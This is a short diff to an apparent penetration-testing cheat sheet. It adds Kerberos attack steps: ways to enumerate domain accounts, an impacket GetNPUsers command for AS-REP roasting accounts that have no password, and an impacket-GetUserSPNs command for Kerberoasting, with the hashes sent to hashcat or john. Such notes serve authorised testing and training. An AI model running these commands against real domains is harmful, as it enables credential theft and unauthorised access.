@@ -106,8 +106,14 @@ nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=/usr/shar
 ```
 
 ### Port 88 - Kerberos
-You will need a vaild account/credentials first.
+You will need a vaild accounts first.
 ```
+Find accounts with enum4linux, crackmapexec, ldapsearch, other sources..
+
+Accounts but no pass
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain/ -no-pass -usersfile users.txt
+
+Accounts and pass
 impacket-GetUserSPNs -dc-ip <INSERTIPADDRESS> domain/username[:password] -request
 
 Take to hashcat or john
